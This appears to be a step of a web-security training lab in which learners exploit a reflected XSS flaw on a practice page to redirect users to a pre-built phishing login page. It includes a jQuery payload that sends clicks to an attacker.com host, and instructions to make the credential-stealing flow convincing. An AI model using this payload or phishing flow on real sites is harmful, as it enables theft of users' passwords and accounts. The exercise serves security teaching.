XSS 2 - Reflected XSS + Phishing!
---------------------------------

![image](img/sword.png)


We've successfully attacked the system with a Stored XSS attack. Now let's try another method - a **Reflected attack**!

Reflected attacks take advantage of unsanitized data that is **injected from the url** and passes it to the code.

### Read again!

If you want, you can browse through [this again](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29).

### Attack!
Our vector of attack is going to be like so:

1. Using a [phishing](https://www.owasp.org/index.php/Phishing) page - a fake login page that has every login attempt send the credentials to your `serve` application. 
	> under `utils/phishing-page` you will find a phishing page I have already created for you

2. Did you notice the *welcome* message poping up once you login? 

	Use that to inject your script to the **gibson** page through the URL! Have the fake login page require the user to log in, after clicking on the anywhere in the page
	> Hint: this is how it is done with jQuery ```$("body").click(function(){window.location="http://www.attacker.com:3000/utils/phishing-page/Login.html"})```

3. You are trying to steal the victim's password! Make the new malicious flow as convincing as possible! 

.. 

..

You would be surprised [how many people](http://docs.apwg.org/reports/apwg_trends_report_q1_2014.pdf) fall victim to these kind of attacks..

### Rolling the attack further

This method of attack doesn't work on all users, but when an unsuspecting user "bites", you will get their *password* and not just a *session*!

If for example, they use the same password as their *gmail* account, you've basically just gotten access to their mail too - and from there - their whole life!
